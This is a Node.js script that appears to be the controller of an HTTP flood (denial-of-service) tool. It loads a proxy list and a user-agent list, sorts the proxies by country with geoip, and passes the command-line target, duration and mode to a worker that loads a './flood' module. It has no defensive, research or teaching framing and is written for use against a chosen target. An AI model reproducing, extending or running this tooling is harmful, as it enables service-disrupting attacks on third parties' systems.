const net = require('net'),
    events = require('events'),
    cluster = require('cluster'),
    fs = require('fs');
process.setMaxListeners(0);
events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;
var log = console.log;
global.logger = function () {
    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {
        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        var milliseconds = date.getMilliseconds();

        return '[' +
            ((hour < 10) ? '0' + hour : hour) +
            ':' +
            ((minutes < 10) ? '0' + minutes : minutes) +
            ':' +
            ((seconds < 10) ? '0' + seconds : seconds) +
            '.' +
            ('00' + milliseconds).slice(-3) +
            '] ';
    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
};

if (cluster.isMaster) {
    let proxies = [...new Set(fs.readFileSync('proxies.txt').toString().match(/\S+/g))],
        dproxies = {
            US: [],
            CN: [],
            KR: []
        };

    let geoip = require('geoip-country');
    proxies.forEach(aproxy => {
        let geo = geoip.lookup(aproxy.split(':')[0]);
        if (geo) {
            if (!dproxies[geo.country]) dproxies[geo.country] = [];
            dproxies[geo.country].push(aproxy);
        } else {
            dproxies.US.push(aproxy);
        }
    });

    console.log(Object.keys(dproxies).join(', '));

    proxies = [];

    cluster.fork().setMaxListeners(0).send({
        target: process.argv[2],
        proxies: dproxies,
        userAgents: [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
        referers: [],
        duration: process.argv[3] * 1e3,
        opt: {
            ratelimit: false
        },
        mode: process.argv[4]
    });
} else {
    require('./flood');
}